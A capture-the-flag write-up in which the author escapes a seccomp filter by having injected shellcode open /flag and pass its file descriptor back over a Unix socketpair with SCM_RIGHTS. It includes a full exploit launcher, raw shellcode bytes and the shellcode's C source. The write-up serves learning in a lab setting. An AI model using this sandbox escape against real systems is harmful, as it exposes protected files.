# Day 10



### Challenge

This is a normal seccomp syscall restriction

```c
(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(openat), 0) < 0 ||
        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(recvmsg), 0) < 0 ||
        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(sendmsg), 0) < 0 ||
        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0) < 0) 
```


### My Solution

First, I created two file descriptors and connected them using `sys_socketpair(AF_UNIX, SOCK_STREAM, 0, fds)`. This gives me a pair of connected sockets that work like a pipe.

Next, I ran the challenge binary, which inherits these file descriptors. Using shellcode inside the challenge binary, I opened the flag file and sent its file descriptor through one end of the socket pair.

From my exploit process, I then received that file descriptor from the other end of the socket pair and used it to read the flag.


>> My Exploit.c
```c
#define _GNU_SOURCE
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>

static inline long sys_socketpair(int d, int t, int p, int sv[2]) {
    return syscall(SYS_socketpair, d, t, p, sv);
}

static inline long sys_fcntl(int fd, int cmd, int arg) {
    return syscall(SYS_fcntl, fd, cmd, arg);
}

static inline long sys_fork(void) {
    return syscall(SYS_fork);
}

static inline long sys_execve(const char *p, char *const a[], char *const e[]) {
    return syscall(SYS_execve, p, a, e);
}

static inline long sys_sendmsg(int fd, const struct msghdr *msg, unsigned int flags) {
    return syscall(SYS_sendmsg, fd, msg, flags);
}

static inline long sys_recvmsg(int fd, struct msghdr *msg, int flags) {
    return syscall(SYS_recvmsg, fd, msg, flags);
}

static inline long sys_read(int fd, void *buf, size_t len) {
    return syscall(SYS_read, fd, buf, len);
}

static inline long sys_write(int fd, const void *buf, size_t len) {
    return syscall(SYS_write, fd, buf, len);
}

int main(void) {
    int fds[2];
    
    if (sys_socketpair(AF_UNIX, SOCK_STREAM, 0, fds) < 0) {
        perror("socketpair");
        return 1;
    }

    sys_fcntl(fds[0], F_SETFL, O_NONBLOCK);
    sys_fcntl(fds[1], F_SETFL, O_NONBLOCK);

    int std_fds[2];
    if (pipe(std_fds) < 0) {
        perror("pipe");
        exit(1);
    }

    printf("%i\n", fds[0]);

    long pid = sys_fork();

    if (pid == 0) {
        // --- child: turn fds[0] into stdin ---
        dup2(std_fds[0], 0);

        close(std_fds[0]);
        close(std_fds[1]);

        char *argv[] = { "/challenge/northpole-relay", NULL };
        char *envp[] = { NULL };

        sys_execve("/challenge/northpole-relay", argv, envp);
        syscall(SYS_exit, 1);
    }

    // shellcode bytes after compiled
    unsigned char buffer[240] = {72, 131, 228, 240, 184, 103, 0, 0, 0, 72, 141, 116, 36, 152, 49, 210, 69, 49, 192, 102, 137, 68, 36, 156, 72, 199, 199, 156, 255, 255, 255, 184, 1, 1, 0, 0, 199, 68, 36, 152, 47, 102, 108, 97, 77, 137, 194, 77, 137, 192, 77, 137, 193, 15, 5, 185, 79, 75, 0, 0, 72, 137, 194, 72, 141, 68, 36, 150, 72, 199, 68, 36, 168, 2, 0, 0, 0, 102, 137, 76, 36, 150, 72, 141, 124, 36, 200, 185, 7, 0, 0, 0, 72, 137, 68, 36, 160, 76, 137, 192, 243, 72, 171, 72, 141, 68, 36, 160, 72, 199, 68, 36, 192, 0, 0, 0, 0, 72, 137, 68, 36, 216, 72, 141, 68, 36, 176, 72, 137, 68, 36, 232, 72, 184, 1, 0, 0, 0, 1, 0, 0, 0, 72, 199, 68, 36, 224, 1, 0, 0, 0, 72, 199, 68, 36, 240, 24, 0, 0, 0, 72, 137, 68, 36, 184, 72, 199, 68, 36, 176, 20, 0, 0, 0, 72, 131, 228, 240, 191, 3, 0, 0, 0, 137, 84, 36, 192, 72, 141, 116, 36, 200, 49, 210, 184, 46, 0, 0, 0, 77, 137, 194, 77, 137, 192, 77, 137, 193, 15, 5, 49, 255, 49, 246, 184, 60, 0, 0, 0, 77, 137, 194, 77, 137, 192, 77, 137, 193, 15, 5, 195};

    write(std_fds[1], buffer, 231);

    close(std_fds[1]);  // signal EOF

    // --- parent ---
    char msgbuf[2];
    char ctrl[CMSG_SPACE(sizeof(int))];
    memset(ctrl, 0, sizeof(ctrl));

    struct iovec io = {
        .iov_base = msgbuf,
        .iov_len = sizeof(msgbuf)
    };

    struct msghdr msg = {
        .msg_name = NULL,
        .msg_namelen = 0,
        .msg_iov = &io,
        .msg_iovlen = 1,
        .msg_control = ctrl,
        .msg_controllen = sizeof(ctrl),
        .msg_flags = 0
    };

    getchar();
    

    // recvmsg from child
    if (sys_recvmsg(fds[1], &msg, 0) <= 0) {
        perror("recvmsg");
        syscall(SYS_exit, 1);
    }

    // print first 2 bytes
    sys_write(1, msgbuf, 2);

    // extract received FD
    struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
    int received_fd = *(int *)CMSG_DATA(cmsg);

    // read from the FD we got
    char second[100];
    int n = sys_read(received_fd, second, sizeof(second));
    if (n > 0)
        sys_write(1, second, n);

    syscall(SYS_exit, 0);
    return 0;
}

```

>>> shellcode.c

```c
#define _GNU_SOURCE
#include <sys/socket.h>
#include <linux/fcntl.h>
#include <linux/openat2.h>
#include <linux/limits.h>
#include <linux/stat.h>
#include <linux/types.h>
#include <sys/syscall.h>
#include <stdint.h>
#include <unistd.h>

/* --- raw syscall stub because -nostdlib removes syscall() --- */
static inline long my_syscall(
    long n, long a0, long a1, long a2,
    long a3, long a4, long a5)
{
    long ret;
    register long rdi asm("rdi") = a0;
    register long rsi asm("rsi") = a1;
    register long rdx asm("rdx") = a2;

    asm volatile(
        "mov %5, %%r10 \n"
        "mov %6, %%r8  \n"
        "mov %7, %%r9  \n"
        "syscall       \n"
        : "=a"(ret)
        : "a"(n), "r"(rdi), "r"(rsi), "r"(rdx),
          "r"(a3), "r"(a4), "r"(a5)
        : "rcx", "r11", "memory"
    );

    return ret;
}
static inline long sys_openat(int dfd, const char *path, int flags, int mode) {
    return my_syscall(__NR_openat, dfd, (long)path, flags, mode, 0, 0);
}

static inline long sys_sendmsg(int fd, const struct msghdr *msg, unsigned int flags) {
    return my_syscall(__NR_sendmsg, fd, (long)msg, flags, 0, 0, 0);
}

static inline long sys_exit(long code) {
    return my_syscall(__NR_exit, code, 0, 0, 0, 0, 0);
}

void _start(void)
{
    asm volatile("and $-16, %rsp");

     char flagbuf[8];
    __builtin_memcpy(flagbuf, "/flag", 6);

    int fd_to_send = sys_openat(AT_FDCWD, flagbuf , O_RDONLY, 0);

    /* payload */
    char data[2] = {'O', 'K'};
    struct iovec io = { .iov_base = data, .iov_len = 2 };

    /* control buf for FD passing */
    char control[CMSG_SPACE(sizeof(int))] = {0};

    struct msghdr msg = {};
    msg.msg_iov        = &io;
    msg.msg_iovlen     = 1;
    msg.msg_control    = control;
    msg.msg_controllen = sizeof(control);

    struct cmsghdr *cmsg = (struct cmsghdr *)control;
    cmsg->cmsg_level = SOL_SOCKET;
    cmsg->cmsg_type  = SCM_RIGHTS;
    cmsg->cmsg_len   = CMSG_LEN(sizeof(int));

    asm volatile("and $-16, %rsp");

    *(int *)CMSG_DATA(cmsg) = fd_to_send;

    sys_sendmsg(3, &msg, 0);

    sys_exit(0);
}

```
